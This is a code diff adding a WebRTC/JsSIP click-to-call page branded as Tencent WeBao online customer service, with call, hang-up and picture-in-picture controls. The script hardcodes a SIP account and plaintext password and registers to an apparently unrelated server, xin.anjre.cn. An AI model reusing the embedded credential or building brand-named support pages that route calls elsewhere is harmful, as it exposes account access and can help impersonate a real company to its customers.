@@ -2,32 +2,205 @@
 <html lang="zh-CN">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>腾讯微保在线客服 - 画中画示例</title>
   <style>
-    :root {
-      --main-blue: #2685fa;
-      --main-blue-dark: #1756a9;
-      --main-blue-light: #eaf3fe;
-      --main-gray: #f5f7fa;
-      --main-font: 'PingFang SC', 'Microsoft YaHei', Arial, sans-serif;
-      --border-radius: 14px;
-    }
     body {
-      font-family: var(--main-font);
-      background: linear-gradient(135deg, var(--main-blue-light) 0%, #fff 100%);
-      min-height: 100vh;
-      margin: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: flex-start;
-    }
-    .logo-box {
-      margin-top: 36px;
-      margin-bottom: 18px;
+      font-family: Arial, sans-serif;
+      background: #f0f4ff;
+      margin: 20px;
       display: flex;
       flex-direction: column;
       align-items: center;
     }
-    .logo-b
+    h1 {
+      color: #1756a9;
+      margin-bottom: 20px;
+    }
+    button {
+      margin: 5px;
+      padding: 12px 24px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      color: white;
+      background: #2685fa;
+      transition: background 0.2s ease;
+    }
+    button:disabled {
+      background: #a5c8f7;
+      cursor: not-allowed;
+    }
+    #hangupButton {
+      background: #ee4747;
+    }
+    #pipButton {
+      background: #47b4ff;
+    }
+    #status {
+      margin-top: 16px;
+      font-size: 18px;
+      color: #1756a9;
+      min-height: 24px;
+    }
+    audio, video {
+      margin-top: 12px;
+      max-width: 100%;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>腾讯微保在线客服</h1>
+
+  <button id="callButton">📞 呼叫客服</button>
+  <button id="hangupButton" disabled>🛑 挂断</button>
+  <button id="pipButton" disabled>🖼️ 开启画中画</button>
+
+  <div id="status">未呼叫</div>
+
+  <audio id="audioRemote" autoplay></audio>
+  <video id="videoRemote" autoplay playsinline></video>
+
+  <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jssip@3.0.10/dist/jssip.min.js"></script>
+  <script>
+    const callButton = document.getElementById('callButton');
+    const hangupButton = document.getElementById('hangupButton');
+    const pipButton = document.getElementById('pipButton');
+    const statusDiv = document.getElementById('status');
+    const remoteAudio = document.getElementById('audioRemote');
+    const remoteVideo = document.getElementById('videoRemote');
+
+    let ua = null;
+    let session = null;
+    let isCalling = false;
+
+    // SIP账号配置，替换成你的
+    const socket = new JsSIP.WebSocketInterface('wss://xin.anjre.cn:8089/ws');
+    const configuration = {
+      sockets: [socket],
+      uri: 'sip:1002020@xin.anjre.cn',
+      password: 'Aa6363463@',
+      session_timers: false,
+      register: true,
+    };
+
+    ua = new JsSIP.UA(configuration);
+
+    ua.on('registered', () => {
+      console.log('注册成功');
+      statusDiv.textContent = 'SIP注册成功，等待呼叫';
+      callButton.disabled = false;
+    });
+    ua.on('registrationFailed', (e) => {
+      console.error('注册失败', e);
+      statusDiv.textContent = 'SIP注册失败，请检查配置';
+      callButton.disabled = true;
+    });
+    ua.on('disconnected', () => {
+      console.warn('SIP连接断开');
+      statusDiv.textContent = 'SIP连接断开';
+      callButton.disabled = true;
+      hangupButton.disabled = true;
+      pipButton.disabled = true;
+    });
+
+    ua.start();
+
+    callButton.onclick = () => {
+      if (isCalling) return;
+      isCalling = true;
+      callButton.disabled = true;
+      hangupButton.disabled = false;
+      pipButton.disabled = true;
+      statusDiv.textContent = '正在呼叫客服...';
+
+      session = ua.call('sip:999999@xin.anjre.cn', {
+        mediaConstraints: { audio: true, video: false },
+        rtcOfferConstraints: {
+          offerToReceiveAudio: 1,
+          offerToReceiveVideo: 0
+        }
+      });
+
+      session.connection.addEventListener('addstream', (event) => {
+        const stream = event.stream;
+        if (stream.getAudioTracks().length > 0) {
+          remoteAudio.srcObject = stream;
+          remoteAudio.style.display = 'block';
+          remoteAudio.play().catch(e => console.warn('audio play fail:', e));
+        }
+        if (stream.getVideoTracks().length > 0) {
+          remoteVideo.srcObject = stream;
+          remoteVideo.style.display = 'block';
+          pipButton.disabled = false;
+        } else {
+          pipButton.disabled = true;
+          remoteVideo.style.display = 'none';
+        }
+      });
+
+      session.on('progress', () => {
+        statusDiv.textContent = '等待客服接听...';
+      });
+
+      session.on('accepted', () => {
+        statusDiv.textContent = '客服通话中';
+      });
+
+      session.on('ended', () => {
+        statusDiv.textContent = '通话已结束';
+        resetUI();
+      });
+
+      session.on('failed', (e) => {
+        statusDiv.textContent = '呼叫失败';
+        console.error('呼叫失败:', e);
+        resetUI();
+      });
+    };
+
+    hangupButton.onclick = () => {
+      if (session) session.terminate();
+    };
+
+    function resetUI() {
+      isCalling = false;
+      callButton.disabled = false;
+      hangupButton.disabled = true;
+      pipButton.disabled = true;
+      remoteAudio.srcObject = null;
+      remoteAudio.style.display = 'none';
+      remoteVideo.srcObject = null;
+      remoteVideo.style.display = 'none';
+      session = null;
+    }
+
+    pipButton.onclick = async () => {
+      if (!document.pictureInPictureEnabled) {
+        alert('您的浏览器不支持画中画');
+        return;
+      }
+      if (!remoteVideo.srcObject || remoteVideo.srcObject.getVideoTracks().length === 0) {
+        alert('当前通话没有视频轨道，无法开启画中画');
+        return;
+      }
+      try {
+        if (document.pictureInPictureElement) {
+          await document.exitPictureInPicture();
+          pipButton.textContent = '🖼️ 开启画中画';
+        } else {
+          await remoteVideo.requestPictureInPicture();
+          pipButton.textContent = '🖼️ 关闭画中画';
+        }
+      } catch (error) {
+        console.error('画中画切换失败:', error);
+        alert('开启画中画失败，请检查浏览器支持及权限');
+      }
+    };
+  </script>
+</body>
+</html>
